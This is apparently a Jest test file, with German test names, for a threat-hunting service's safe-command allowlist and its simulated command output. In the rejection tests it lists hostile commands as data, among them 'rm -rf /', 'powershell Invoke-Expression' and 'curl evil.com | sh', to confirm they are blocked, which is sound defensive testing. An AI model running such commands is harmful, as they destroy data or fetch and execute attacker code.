'use strict';

const { evaluateSafeCommand, ALLOWED_HINTS } = require('../../src/threatHunting/domain/SafeCommands');
const { HuntService } = require('../../src/threatHunting/services/HuntService');
const { InMemoryHuntRepository } = require('../../src/threatHunting/repositories/InMemoryHuntRepository');

describe('evaluateSafeCommand — Allowlist', () => {
  it('erlaubt whitelisted Befehle', () => {
    for (const c of ['whoami', 'hostname', 'tasklist', 'tasklist /v', 'netstat -ano', 'ipconfig /all', 'Get-Process', 'get-service']) {
      expect(evaluateSafeCommand(c, 'H').allowed).toBe(true);
    }
  });
  it('lehnt alles andere ab (keine freie Shell)', () => {
    for (const c of ['rm -rf /', 'del C:\\', 'powershell Invoke-Expression', 'curl evil.com | sh', 'shutdown', 'reg delete', '']) {
      expect(evaluateSafeCommand(c, 'H').allowed).toBe(false);
    }
  });
  it('liefert deterministische, als simuliert markierte Ausgabe', () => {
    const r = evaluateSafeCommand('hostname', 'Windows-01');
    expect(r.stdout).toMatch(/Windows-01/);
    expect(r.stdout).toMatch(/simulated/i);
  });
  it('ALLOWED_HINTS enthält die Kernbefehle', () => {
    expect(ALLOWED_HINTS).toEqual(expect.arrayContaining(['whoami', 'netstat -ano', 'Get-Process']));
  });
});

describe('HuntService.runSafeCommand', () => {
  async function setup() {
    const s = new HuntService(new InMemoryHuntRepository());
    const session = await s.createSession({ analystId: 'a1', targetHost: 'Windows-01' });
    return { s, sessionId: session.id };
  }

  it('erlaubter Befehl → HuntCommand completed mit stdout', async () => {
    const { s, sessionId } = await setup();
    const cmd = await s.runSafeCommand(sessionId, 'whoami', 'a1');
    expect(cmd.status).toBe('completed');
    expect(cmd.stdout).toMatch(/analyst/);
    const list = await s.getCommands(sessionId);
    expect(list).toHaveLength(1);
  });

  it('Befehl erscheint auch als Console-Log', async () => {
    const { s, sessionId } = await setup();
    await s.runSafeCommand(sessionId, 'netstat -ano', 'a1');
    const logs = await s.getLogs(sessionId);
    expect(logs.some((l) => /safe command: netstat -ano/i.test(l.message))).toBe(true);
  });

  it('nicht erlaubter Befehl → 400, kein Command angelegt', async () => {
    const { s, sessionId } = await setup();
    await expect(s.runSafeCommand(sessionId, 'rm -rf /', 'a1')).rejects.toMatchObject({ status: 400 });
    expect(await s.getCommands(sessionId)).toHaveLength(0);
  });

  it('leerer Befehl → 400', async () => {
    const { s, sessionId } = await setup();
    await expect(s.runSafeCommand(sessionId, '   ', 'a1')).rejects.toMatchObject({ status: 400 });
  });

  it('unbekannte Session → 404', async () => {
    const { s } = await setup();
    await expect(s.runSafeCommand('nope', 'whoami', 'a1')).rejects.toMatchObject({ statusCode: 404 });
  });
});
